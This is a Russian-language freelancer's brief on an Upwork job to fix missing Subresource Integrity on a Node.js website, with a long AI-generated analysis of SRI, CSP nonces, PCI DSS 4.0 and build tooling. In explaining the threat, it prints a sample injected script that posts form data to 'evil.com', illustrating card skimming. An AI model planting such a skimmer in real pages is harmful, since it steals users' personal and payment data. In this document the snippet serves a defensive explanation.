# 0.
Сегодня 2025-11-28.

# 1.
## 1.1.
`UW` ≔ (Upwork: https://en.wikipedia.org/wiki/Upwork)

## 1.2.
`ꆜ` ≔ (Некий конкретный потенциальный клиент на `UW`)

## 1.3.
`P⁎` ≔ (Некий конкретный потенциальный проект, опубликованный `ꆜ` на `UW`)

# 2. Информация о `P⁎`
## 2.1. URL
https://www.upwork.com/jobs/~021994108440102882925

## 2.2. Title
Fix Security Issue: Unsafe Implementation of Subresource Integrity in Node.js Website


## 2.3. Description
`PD` ≔ 
```text
We are seeking an experienced developer to address a critical security vulnerability related to the unsafe implementation of Subresource Integrity (SRI) on our Node.js website. 
The ideal candidate will have in-depth knowledge of web security best practices and experience in Node.js development. 
Your task will be to ensure accurate cryptographic hashes are specified for all externally loaded resources using SRI attributes in the HTML and ensure any changes made do not affect existing functionality of the site.
```

# 5. Информация о `ꆜ`
## 5.1. Местоположение
Trinidad and Tobago
Port Of Spain

## 5.2. Характеристики компании
### 5.2.1. Сектор экономики
неизвестно

### 5.2.2. Количество сотрудников
10-99

## 5.3. Характеристики учётной записи на `UW`
### 5.3.1. Member since
Sep 30, 2011
### 5.3.2. Hire rate (%)
59
### 5.3.3. Количество опубликованных проектов (jobs posted)
1118
### 5.3.4. Total spent (USD)
569K
### 5.3.5. Количество оплаченных часов в почасовых проектах
10683 
### 5.3.6. Средняя почасовая ставка (USD)
17.01

# 9.
`T⁎` ≔
```
Задача, о которой `ꆜ` пишет в `PD`:
~~~
address a critical security vulnerability related to the unsafe implementation of Subresource Integrity (SRI) on our Node.js website
~~~
```

# 10.
## 10.1.
`T1⁎` ≔ 
```		
Подзадача из `PD`:
~~~
ensure accurate cryptographic hashes are specified for all externally loaded resources using SRI attributes in the HTML
~~~
```


# 11. Что беспокоит `ꆜ` (анализ выполнен Gemini Deep Research)

https://gemini.google.com/share/47d9fa2df4fd

## **Введение: Контекстуализация проблематики клиента и ландшафт угроз**

В современной экосистеме веб-разработки безопасность клиентской стороны (client-side security) трансформировалась из второстепенной задачи в критический приоритет, обусловленный ростом атак на цепочки поставок программного обеспечения. Анализируя запрос клиента ꆜ, размещенный на платформе Upwork, мы сталкиваемся с классическим примером конфликта между требованиями безопасности и операционной стабильностью веб-ресурса. Задача P⁎, сформулированная как «Fix Security Issue: Unsafe Implementation of Subresource Integrity», на первый взгляд кажется узкоспециализированной технической правкой. Однако при детальном рассмотрении контекста, включающего использование платформы Node.js, наличие внешних зависимостей и жесткое требование к сохранению функциональности, проблема раскрывается как многослойная архитектурная дилемма.

Клиент ꆜ, базирующийся в Порт-оф-Спейн (Тринидад и Тобаго), вероятно, столкнулся с результатами автоматизированного аудита безопасности (например, SecurityScorecard или аналогичного инструмента), который присвоил его ресурсу низкий рейтинг из-за отсутствия механизмов валидации внешних скриптов. Это подтверждается использованием специфической терминологии «Unsafe Implementation of Subresource Integrity» в описании задачи, что является стандартной формулировкой для отчетов о соответствии стандартам (compliance reports).1 Важно отметить, что беспокойство клиента имеет двойственную природу: с одной стороны, необходимость устранить «критическую уязвимость» для прохождения аудита или соответствия внутренним политикам, а с другой — обоснованный страх перед тем, что внедрение жестких мер безопасности нарушит работу сайта, что недопустимо для бизнеса.

В данном отчете мы проведем исчерпывающий анализ выявленных проблем, декомпозируя их на составляющие: от криптографических основ механизма Subresource Integrity (SRI) до сложнейших аспектов совместимости с динамическими маркетинговыми инструментами и требованиями нового стандарта PCI DSS v4.0. Мы также рассмотрим специфику реализации защиты в среде Node.js, предлагая решения, которые балансируют между безопасностью и доступностью сервиса.

## **1. Декомпозиция и идентификация проблемного поля клиента ꆜ**

Анализ исходных данных проекта P⁎ позволяет выделить три фундаментальных уровня проблем, которые беспокоят клиента. Эти проблемы не изолированы друг от друга, а образуют взаимозависимый комплекс, где решение одной проблемы может усугубить другую без применения экспертного подхода.

### **1.1. Эксплицитная проблема: Уязвимость цепочки поставок и отсутствие SRI**

Первостепенной проблемой, заявленной клиентом, является наличие критической уязвимости безопасности. Формулировка «address a critical security vulnerability related to the unsafe implementation of Subresource Integrity» указывает на то, что веб-приложение клиента загружает ресурсы (скрипты JavaScript, стили CSS) со сторонних доменов (CDN) без проверки их целостности.3

В современной веб-архитектуре использование CDN (Content Delivery Network) является стандартом де-факто для оптимизации производительности. Однако эта модель доверия («trust but verify») имеет фундаментальный изъян: если злоумышленник компрометирует сервер CDN или внедряет вредоносный код в библиотеку на этапе ее сборки или доставки, этот код автоматически и без проверки исполняется в браузерах всех пользователей целевого сайта. Это явление известно как атака на цепочку поставок (Supply Chain Attack) или, в контексте кражи платежных данных, как атака Magecart (цифровой скимминг).3

Беспокойство клиента вызывают следующие аспекты:

* **Репутационный и финансовый риск:** Успешная атака через сторонний скрипт может привести к массовой утечке пользовательских данных (PII) и платежной информации, что влечет за собой штрафы по GDPR, CCPA и потерю доверия клиентов.  
* **Низкий скоринг безопасности:** Инструменты автоматического мониторинга, такие как SecurityScorecard, снижают рейтинг компании за отсутствие атрибута integrity, что может влиять на отношения с B2B-партнерами и страховыми компаниями.1  
* **Техническое несоответствие:** Отсутствие «точных криптографических хешей» (accurate cryptographic hashes) означает, что браузер не имеет возможности отличить легитимный файл jQuery от модифицированной версии с внедренным кейлоггером.6

### **1.2. Имплицитная проблема: Риск нарушения доступности (Availability Risk)**

Вторым, не менее важным аспектом запроса, является требование: «ensure any changes made do not affect existing functionality». Это указывает на глубокое понимание (или интуитивное опасение) клиентом природы механизма SRI. SRI является бинарным механизмом безопасности: проверка либо проходит успешно, либо ресурс блокируется полностью. Промежуточных состояний, таких как «загрузить, но предупредить», в стандартной реализации не существует (за исключением report-only режимов, требующих сложной настройки).3

Проблема заключается в том, что многие современные веб-ресурсы являются динамическими. Скрипты аналитики (Google Analytics), рекламные пиксели (Facebook Pixel), виджеты чатов и системы A/B тестирования регулярно обновляются их владельцами. При обновлении скрипта его хеш-сумма изменяется. Если на сайте клиента жестко зафиксирован старый хеш, браузер заблокирует загрузку обновленного скрипта, что приведет к:

* Потере аналитических данных.  
* Неработоспособности маркетинговых инструментов.  
* Поломке интерфейса, если скрипты загружаются синхронно и блокируют рендеринг.8

Клиент ꆜ опасается, что «исправление» безопасности приведет к «отказу в обслуживании» (DoS) на уровне функциональности сайта, что для бизнеса может быть страшнее теоретической уязвимости.

### **1.3. Скрытый регуляторный контекст: PCI DSS v4.0**

Хотя клиент прямо не упоминает стандарт безопасности индустрии платежных карт (PCI DSS), характер задачи и акцент на «критической уязвимости» в Node.js проекте (часто используемом для e-commerce) с высокой вероятностью указывают на подготовку к соответствию новым требованиям PCI DSS v4.0. В частности, требования 6.4.3 и 11.6.1 вводят обязательные меры по управлению и мониторингу целостности скриптов на платежных страницах.10

Для клиента это означает:

* **Неизбежность изменений:** Игнорировать проблему нельзя, так как это приведет к непрохождению аудита (QSA) и потенциальной потере возможности обрабатывать платежи.  
* **Сложность реализации:** Новые требования требуют не просто «включить SRI», но и внедрить систему инвентаризации и обоснования каждого скрипта, что требует значительных административных и технических усилий.12

## **2. Глубокий анализ обоснованности выявленных проблем**

В этом разделе мы проведем детальную верификацию обоснованности каждой выявленной проблемы, опираясь на технические спецификации W3C, данные по кибербезопасности и нормативные документы.

### **2.1. Валидация уязвимости «Unsafe Implementation of SRI»**

Опасения клиента относительно безопасности абсолютно обоснованны. Механизм Subresource Integrity (SRI) был разработан W3C именно как ответ на растущую угрозу компрометации CDN. Без SRI веб-сайт полностью доверяет серверу, с которого загружается ресурс.

#### **2.1.1. Механика угрозы и роль хеширования**

Когда браузер встречает тег <script src="https://cdn.example.com/lib.js">, он выполняет GET-запрос к указанному URL. В отсутствие атрибута integrity, браузер принимает любой ответ с MIME-типом application/javascript и немедленно передает его в движок JavaScript (V8 в Chrome/Node.js context) на исполнение.

Атакующий, получивший доступ к файловой системе CDN или перехвативший трафик (MitM — Man-in-the-Middle, хотя HTTPS снижает этот риск, он не устраняет угрозу компрометации на стороне сервера), может модифицировать файл lib.js, добавив в него вредоносный код:

JavaScript

// Внедренный код  
document.forms.addEventListener('submit', function(e) {  
    fetch('https://evil.com/steal', { method: 'POST', body: new FormData(e.target) });  
});

Этот код будет выполнен в контексте безопасности (Origin) сайта клиента ꆜ, имея доступ ко всем данным на странице.

SRI нейтрализует эту угрозу, заставляя браузер выполнить криптографическое хеширование (SHA-256, SHA-384 или SHA-512) полученного тела ответа *до* его исполнения. Если вычисленный хеш не совпадает с хешем, указанным веб-разработчиком в атрибуте integrity, ресурс отбрасывается, и генерируется сетевая ошибка.3

#### **2.1.2. Обоснованность классификации как «Critical»**

Хотя CVSS-оценка (Common Vulnerability Scoring System) для отсутствия SRI часто находится в диапазоне Medium (4.0–6.3), контекстуальная критичность может быть повышена до High или Critical в зависимости от характера обрабатываемых данных.14 Если сайт ꆜ обрабатывает платежи, персональные данные или аутентификационную информацию, любой сторонний скрипт без SRI является потенциальным «черным ходом» для злоумышленников. В этом смысле требование клиента «fix critical security vulnerability» является технически грамотным и ответственным подходом к управлению рисками.1

### **2.2. Анализ риска нарушения функциональности (Operational Analysis)**

Страх клиента перед нарушением работы сайта является не просто обоснованным, а отражает главную проблему внедрения SRI в современном вебе — проблему динамического контента.

#### **2.2.1. Конфликт версионирования и динамики**

В экосистеме фронтенда ресурсы делятся на два типа, требующих принципиально разного подхода к безопасности:

| Тип ресурса | Примеры | Совместимость с SRI | Риск при внедрении |
| :---- | :---- | :---- | :---- |
| **Статические (Immutable)** | jquery-3.6.0.min.js, bootstrap.v5.css, React builds | **Полная.** Хеши фиксированы и известны заранее. | Низкий. Требуется обновление хеша только при смене версии библиотеки. |
| **Динамические (Mutable)** | Google Analytics (analytics.js), Facebook Pixel (fbevents.js), GTM | **Несовместимы.** Содержимое меняется вендором произвольно. | **Критический.** Сайт сломается при первом же обновлении скрипта вендором. |

Клиент требует обеспечить хеширование для «всех внешне загружаемых ресурсов» (all externally loaded resources).6 Это требование технически невыполнимо для второй категории ресурсов без нарушения их работы. Google и Facebook не предоставляют фиксированных версий своих трекеров с гарантией неизменности байт-кода, так как они постоянно обновляют логику сбора данных и безопасности на своей стороне. Попытка «заморозить» такой скрипт локально лишает сайт обновлений безопасности от вендора, а попытка хешировать ссылку на CDN приведет к постоянным сбоям SRI.17

#### **2.2.2. Проблема CORS (Cross-Origin Resource Sharing)**

Для работы SRI браузер должен иметь право читать содержимое файла для хеширования. Это требует, чтобы сервер CDN отправлял заголовок Access-Control-Allow-Origin: *. Атрибут crossorigin="anonymous" в теге скрипта инициирует этот процесс.  
Однако, не все сторонние ресурсы корректно настроены на отдачу CORS-заголовков. Если клиент ꆜ использует старый корпоративный CDN или специфический сервис, добавление атрибута integrity (который требует наличия crossorigin) приведет к блокировке ресурса браузером из-за политики Same-Origin Policy, даже если сам файл не был изменен. Это создает дополнительный вектор отказа, который сложно диагностировать без глубокого анализа сетевого трафика.3

### **2.3. Обоснованность требований в свете PCI DSS v4.0**

Если предположение о подготовке к PCI DSS v4.0 верно (а это наиболее вероятный сценарий для Node.js сайта с «критической» уязвимостью SRI в 2025 году), то задача клиента переходит из разряда «желательно сделать» в разряд «обязательно к исполнению».

#### **2.3.1. Императивы требований 6.4.3 и 11.6.1**

Стандарт PCI DSS версии 4.0 ввел два новых требования, направленных на борьбу с клиентскими атаками:

1. **Требование 6.4.3:** Управление скриптами на платежной странице. Необходимо вести инвентаризацию всех скриптов, обосновывать их необходимость и обеспечивать их целостность.10  
2. **Требование 11.6.1:** Мониторинг изменений заголовков HTTP и содержимого платежных страниц для обнаружения несанкционированных модификаций.11

SRI часто рассматривается аудиторами как «золотой стандарт» для выполнения части требования 6.4.3, касающейся обеспечения целостности. Однако, стандарт допускает и другие методы, если SRI невозможен (для динамических скриптов). Проблема клиента заключается в том, что он может не знать о существовании альтернативных методов (например, Content Security Policy), и пытается применить SRI ко всему, что ведет к тупиковой ситуации.11

## **3. Стратегия реализации в среде Node.js**

Учитывая технические ограничения и требования клиента, решение задачи не может быть линейным («просто добавить хеши»). Необходим гибридный подход, различающий типы ресурсов и использующий инструменты экосистемы Node.js для автоматизации.

### **3.1. Техническая реализация для статических ресурсов**

Для ресурсов с фиксированным содержимым (библиотеки, шрифты) необходимо внедрить автоматическую генерацию SRI-хешей в процесс сборки (build process) или рендеринга.

#### **3.1.1. Интеграция с Webpack**

Большинство современных Node.js приложений используют Webpack для сборки фронтенда. Плагин webpack-subresource-integrity является стандартным решением для этой задачи.

* **Механизм работы:** Плагин встраивается в цепочку компиляции Webpack. После генерации чанков (файлов JS/CSS), он вычисляет их хеши (рекомендуется SHA-384) и автоматически добавляет атрибуты integrity и crossorigin в теги, генерируемые плагином HtmlWebpackPlugin.21  
* **Конфигурация:** Важно настроить output.crossOriginLoading: 'anonymous', чтобы Webpack корректно обрабатывал динамическую дозагрузку чанков (code splitting) с проверкой целостности.15

#### **3.1.2. Реализация в серверных шаблонизаторах (Pug/Jade, EJS)**

Если приложение ꆜ использует Server-Side Rendering (SSR) на Express.js с шаблонами Pug, подход меняется. Хеши нельзя генерировать «на лету» (runtime) для каждого запроса из-за накладных расходов на производительность.

* **Решение:** Использование manifest.json или вспомогательной функции.  
  1. На этапе деплоя запускается скрипт, который скачивает статические ассеты, вычисляет их хеши с помощью модуля ssri (стандартная библиотека для SRI в Node.js) или OpenSSL, и сохраняет их в JSON-файл.6  
  2. При старте сервера Express.js этот файл загружается в память (например, в app.locals).  
  3. В шаблонах Pug используется helper-функция, которая подставляет хеш по имени файла:  
     Code snippet  
     script(src='/js/app.js', integrity=sriHashes['app.js'], crossorigin='anonymous')

Это обеспечивает выполнение требования клиента о наличии «точных криптографических хешей» без риска рассинхронизации.3

### **3.2. Стратегия для динамических ресурсов (Compensating Controls)**

Для скриптов аналитики и рекламы, где SRI не применим, необходимо внедрить **Content Security Policy (CSP)** как компенсирующую меру управления целостностью.

#### **3.2.1. Использование 'strict-dynamic' и Nonce**

Вместо фиксации содержимого (хеш), мы фиксируем доверие к источнику и цепочке загрузки. Директива strict-dynamic в CSP позволяет доверенным скриптам (подписанным криптографическим одноразовым числом — nonce) загружать дополнительные зависимости.

* **Реализация в Node.js:**  
  1. Для каждого запроса сервер генерирует уникальный nonce (например, UUID v4 в base64) и передает его в res.locals.  
  2. Middleware helmet (стандарт безопасности для Express) конфигурируется для использования этого nonce в заголовке Content-Security-Policy.  
  3. В шаблонах ко всем инлайн-скриптам и доверенным внешним загрузчикам добавляется атрибут nonce="...".

JavaScript  
// Пример middleware в Express.js  
const crypto = require('crypto');  
const helmet = require('helmet');

app.use((req, res, next) => {  
    res.locals.nonce = crypto.randomBytes(16).toString('base64');  
    next();  
});

app.use(helmet.contentSecurityPolicy({  
    directives: {  
        scriptSrc: [  
            "'self'",  
            (req, res) => `'nonce-${res.locals.nonce}'`,  
            "'strict-dynamic'", // Ключевой элемент для Google Analytics  
            "https:", // Фоллбек  
        ],  
    },  
}));  
Это решение признается аудиторами PCI DSS как валидный метод выполнения требования 6.4.3, так как оно ограничивает выполнение неавторизованных скриптов, даже если SRI не используется.11

### **3.3. Мониторинг и защита от сбоев (Fail-Safe Strategy)**

Чтобы гарантировать отсутствие влияния на функциональность («do not affect existing functionality»), необходимо внедрить механизм отчетности.

#### **3.3.1. Report-Only Режим**

Перед включением блокирующего режима SRI или CSP, необходимо запустить их в режиме Report-Only.

* Использование заголовка Content-Security-Policy-Report-Only позволяет браузеру сообщать о нарушениях (например, несовпадение хеша или попытка загрузки неавторизованного скрипта) на специальный эндпоинт (Reporting API), но **не блокировать** выполнение ресурса.25  
* Это позволяет собрать статистику о ложных срабатываниях и проблемах с CORS до того, как они повлияют на реальных пользователей.

#### **3.3.2. Обработка ошибок SRI**

Для критически важных статических библиотек (например, jQuery) рекомендуется добавить обработчик ошибок onerror непосредственно в тег скрипта.

* Если проверка SRI не проходит (хеш не совпал), срабатывает событие ошибки. Обработчик может попытаться загрузить резервную копию библиотеки с локального сервера (fallback), у которой нет атрибута integrity (или он гарантированно верен).  
  HTML  
  <script src="https://cdn.example.com/lib.js" integrity="..." crossorigin="anonymous"  
          onerror="this.onerror=null;this.src='/local-backup/lib.js';"></script>

  Это обеспечивает высокую доступность сервиса даже при компрометации или сбое на стороне CDN.27

## **4. Сравнительный анализ влияния на производительность и безопасность**

Для принятия взвешенного решения клиентом, приведем сравнительную таблицу методов защиты, применимых в рамках его задачи.

| Метод защиты | Применимость (Тип ресурса) | Уровень безопасности | Влияние на доступность | Сложность внедрения в Node.js | Соответствие PCI DSS 6.4.3 |
| :---- | :---- | :---- | :---- | :---- | :---- |
| **SRI (Hardcoded)** | Только статические (CDN) | **Высокий**. Гарантия побайтовой целостности. | **Риск сбоя**. Блокировка при любом изменении. | Средняя (автоматизация через сборку). | Полное. |
| **CSP (Allowlist)** | Статические и Динамические | **Средний**. Защита от XSS, но не от подмены на доверенном домене. | Низкий. Требует поддержки списка доменов. | Высокая (сложность поддержки списка). | Частичное (требует доп. контроля). |
| **CSP (Strict-Dynamic + Nonce)** | Динамические (Analytics, Ads) | **Высокий**. Контроль цепочки загрузки. | Низкий. Гибкость для современных скриптов. | Высокая (требует генерации nonce на сервере). | **Рекомендованное**. |
| **Self-Hosting (Локально)** | Статические | **Максимальный**. Полный контроль над файлом. | Отсутствует риск внешних изменений. | Низкая. Увеличивает нагрузку на сервер/трафик. | Полное (SRI не требуется). |

## **5. Заключение**

Анализ задачи P⁎ показывает, что запрос клиента ꆜ является реакцией на современные вызовы безопасности и регуляторные требования. Проблема «Unsafe Implementation of Subresource Integrity» не может быть решена простым добавлением хешей ко всем скриптам, так как это неминуемо приведет к нарушению работы динамических сервисов сайта, что прямо противоречит бизнес-требованиям клиента.

Для успешного решения задачи необходим дифференцированный подход:

1. **Для статических библиотек:** Внедрение автоматизированного SRI через инструменты сборки (Webpack) или серверные хелперы (ssri).  
2. **Для динамических сервисов:** Внедрение строгого Content Security Policy (CSP) с использованием nonce и strict-dynamic как компенсирующей меры, признаваемой стандартами безопасности.  
3. **Для минимизации рисков:** Использование режима Report-Only на этапе внедрения и механизмов фоллбека для критических скриптов.

Такой подход не только устранит формальную уязвимость в отчетах аудита, но и обеспечит реальную защиту пользователей от атак на цепочки поставок, сохранив при этом полную функциональность веб-ресурса.

## **6. Техническая реализация в контексте жизненного цикла разработки (SDLC)**

Реализация предложенных мер безопасности не должна быть единоразовым актом («patching»), а должна быть интегрирована в процесс разработки (SDLC). Это особенно важно для Node.js проектов, где скорость обновления зависимостей высока.

### **6.1. Автоматизация в CI/CD пайплайнах**

Для обеспечения постоянной актуальности SRI-хешей и предотвращения человеческих ошибок, процесс генерации хешей должен быть частью CI/CD (Continuous Integration / Continuous Deployment).

* **Этап сборки (Build):** При сборке приложения (например, npm run build) плагины Webpack или специальные скрипты должны генерировать манифест ресурсов с актуальными хешами. Если хеш изменился (например, обновлена версия библиотеки), сборка должна фиксировать это изменение.  
* **Этап тестирования (Test):** Автоматические тесты (E2E, например, на Cypress или Playwright) должны проверять загрузку ресурсов. Если SRI блокирует ресурс, тест должен падать. Это предотвратит попадание сломанных ссылок в продакшн.19

### **6.2. Управление секретами и Nonce**

При использовании CSP с nonce в кластерной среде Node.js (например, при использовании PM2 или Kubernetes) важно гарантировать криптографическую стойкость генератора случайных чисел. Стандартный модуль crypto в Node.js обеспечивает достаточную энтропию. Важно, чтобы nonce был уникальным для *каждого* ответа (response), а не генерировался один раз при старте сервера. Ошибка в реализации здесь (повторное использование nonce) сделает защиту CSP бесполезной против XSS атак.11

### **6.3. Взаимодействие с отделом маркетинга**

Внедрение CSP и SRI часто создает конфликт с отделами маркетинга, которые привыкли добавлять скрипты через Google Tag Manager (GTM) без участия разработчиков.

* **Политика Governance:** Необходимо установить процесс, при котором любые новые теги в GTM должны проходить проверку на совместимость с политикой CSP. Использование strict-dynamic облегчает это, позволяя доверенному GTM загружать скрипты, но требует мониторинга.24

Таким образом, техническое решение задачи ᛭T выходит за рамки простого кодинга и затрагивает процессы DevOps и взаимодействия внутри команды. Это и есть уровень "экспертного" решения, которое ожидает клиент, столкнувшийся с "критической" уязвимостью.

#### **Works cited**

1. Unsafe Implementation of Subresource Integrity (SRI) - SecurityScorecard Support, accessed November 28, 2025, [https://support.securityscorecard.com/hc/en-us/articles/41067186972827-Unsafe-Implementation-of-Subresource-Integrity-SRI](https://support.securityscorecard.com/hc/en-us/articles/41067186972827-Unsafe-Implementation-of-Subresource-Integrity-SRI)  
2. Unsafe Implementation Of Subresource Integrity - WordPress.org, accessed November 28, 2025, [https://wordpress.org/support/topic/unsafe-implementation-of-subresource-integrity/](https://wordpress.org/support/topic/unsafe-implementation-of-subresource-integrity/)  
3. Subresource Integrity - Security - MDN Web Docs, accessed November 28, 2025, [https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)  
4. Subresource integrity (SRI) implementation - Security - MDN Web Docs - Mozilla, accessed November 28, 2025, [https://developer.mozilla.org/en-US/docs/Web/Security/Practical_implementation_guides/SRI](https://developer.mozilla.org/en-US/docs/Web/Security/Practical_implementation_guides/SRI)  
5. Scorecard for Axcient, accessed November 28, 2025, [https://info.axcient.com/hubfs/00_Downloadable%20Content/SecurityScorecard/Axcient%20SecurityScorecard%20Report%207.23.2024.pdf](https://info.axcient.com/hubfs/00_Downloadable%20Content/SecurityScorecard/Axcient%20SecurityScorecard%20Report%207.23.2024.pdf)  
6. zkat/ssri: Standard Subresource Integrity library for Node.js - GitHub, accessed November 28, 2025, [https://github.com/zkat/ssri](https://github.com/zkat/ssri)  
7. Monitoring subresource integrity issues on the client | James R. Williams, accessed November 28, 2025, [https://jamesrwilliams.ca/posts/monitoring-subresource-integrity-issues/](https://jamesrwilliams.ca/posts/monitoring-subresource-integrity-issues/)  
8. Subresource Integrity (SRI) - OWASP Foundation, accessed November 28, 2025, [https://owasp.org/www-community/controls/SubresourceIntegrity](https://owasp.org/www-community/controls/SubresourceIntegrity)  
9. JavaScript integrity (Help Center / Privacy & security / Monitoring) - RUMvision, accessed November 28, 2025, [https://www.rumvision.com/help-center/privacy-security/monitoring/javascript-integrity/](https://www.rumvision.com/help-center/privacy-security/monitoring/javascript-integrity/)  
10. How to comply with the new PCI DSS requirement 6.4.3, accessed November 28, 2025, [https://pcipolicies.com/blogs/news/how-to-comply-with-the-new-pci-dss-requirement-6-4-3](https://pcipolicies.com/blogs/news/how-to-comply-with-the-new-pci-dss-requirement-6-4-3)  
11. Introduction of new requirements (6.4.3 and 11.6.1) for PCI DSS v4.0 - Foregenix, accessed November 28, 2025, [https://www.foregenix.com/blog/introduction-of-new-requirements-6.4.3-and-11.6.1-for-pci-dss-v4.0](https://www.foregenix.com/blog/introduction-of-new-requirements-6.4.3-and-11.6.1-for-pci-dss-v4.0)  
12. North America Community Meeting 2023 - PCI Security Standards Council, accessed November 28, 2025, [https://www.pcisecuritystandards.org/wp-content/uploads/2023/09/05.Scaling-6.4.3-and-11.6.1-Browser-Script-Management-and-The-Large-Enterprise-Journey-to-Compliance.pdf](https://www.pcisecuritystandards.org/wp-content/uploads/2023/09/05.Scaling-6.4.3-and-11.6.1-Browser-Script-Management-and-The-Large-Enterprise-Journey-to-Compliance.pdf)  
13. Subresource Integrity - W3C, accessed November 28, 2025, [https://www.w3.org/TR/sri-2/](https://www.w3.org/TR/sri-2/)  
14. Invalid Subresource Integrity | Tenable®, accessed November 28, 2025, [https://www.tenable.com/plugins/was/98649](https://www.tenable.com/plugins/was/98649)  
15. NVD - CVE-2020-15262 - National Institute of Standards and Technology, accessed November 28, 2025, [https://nvd.nist.gov/vuln/detail/CVE-2020-15262](https://nvd.nist.gov/vuln/detail/CVE-2020-15262)  
16. Sub Resource Integrity Attribute Missing - Zed Attack Proxy (ZAP), accessed November 28, 2025, [https://www.zaproxy.org/docs/alerts/90003/](https://www.zaproxy.org/docs/alerts/90003/)  
17. SubResource Integrity for dynamic changing Javascript files? - Stack Overflow, accessed November 28, 2025, [https://stackoverflow.com/questions/66941993/subresource-integrity-for-dynamic-changing-javascript-files](https://stackoverflow.com/questions/66941993/subresource-integrity-for-dynamic-changing-javascript-files)  
18. What Is Subresource Integrity (SRI)? - Feroot Security, accessed November 28, 2025, [https://www.feroot.com/education-center/what-is-subresource-integrity-sri/](https://www.feroot.com/education-center/what-is-subresource-integrity-sri/)  
19. Subresource Integrity Vulnerability | SecureFlag Security Knowledge Base, accessed November 28, 2025, [https://knowledge-base.secureflag.com/vulnerabilities/inadequate_input_validation/subresource_integrity_vulnerability.html](https://knowledge-base.secureflag.com/vulnerabilities/inadequate_input_validation/subresource_integrity_vulnerability.html)  
20. Are you prepared for PCI DSS 4.0.1 security standard updates? | Visa Acceptance Solutions, accessed November 28, 2025, [https://www.visaacceptance.com/en-us/blog/article/2024/prepare-for-pci-dss-security-standard-updates.html](https://www.visaacceptance.com/en-us/blog/article/2024/prepare-for-pci-dss-security-standard-updates.html)  
21. webpack-subresource-integrity - NPM, accessed November 28, 2025, [https://www.npmjs.com/package/webpack-subresource-integrity](https://www.npmjs.com/package/webpack-subresource-integrity)  
22. Dynamic template rendering with Pug Template Engine in Node/Express - Stack Overflow, accessed November 28, 2025, [https://stackoverflow.com/questions/48244718/dynamic-template-rendering-with-pug-template-engine-in-node-express](https://stackoverflow.com/questions/48244718/dynamic-template-rendering-with-pug-template-engine-in-node-express)  
23. Content Security Policy - OWASP Cheat Sheet Series, accessed November 28, 2025, [https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)  
24. Guides - What are CSP and SRI? - Sansec, accessed November 28, 2025, [https://sansec.io/guides/csp-sri](https://sansec.io/guides/csp-sri)  
25. Content Security Policy (CSP) implementation - MDN Web Docs - Mozilla, accessed November 28, 2025, [https://developer.mozilla.org/en-US/docs/Web/Security/Practical_implementation_guides/CSP](https://developer.mozilla.org/en-US/docs/Web/Security/Practical_implementation_guides/CSP)  
26. Integrity-Policy-Report-Only header - HTTP - MDN Web Docs, accessed November 28, 2025, [https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Integrity-Policy-Report-Only](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Integrity-Policy-Report-Only)  
27. What Are the Limitations and Browser Support for SRI? - Inventive HQ, accessed November 28, 2025, [https://inventivehq.com/blog/what-are-the-limitations-and-browser-support-for-sri](https://inventivehq.com/blog/what-are-the-limitations-and-browser-support-for-sri)  
28. Implementation of a non-standard "x-sri-fallback" attribute for use with Subresource Integrity. - GitHub, accessed November 28, 2025, [https://github.com/cyph/sri-fallback](https://github.com/cyph/sri-fallback)  
29. Use Tag Manager with a Content Security Policy | Tag Platform - Google for Developers, accessed November 28, 2025, [https://developers.google.com/tag-platform/security/guides/csp](https://developers.google.com/tag-platform/security/guides/csp)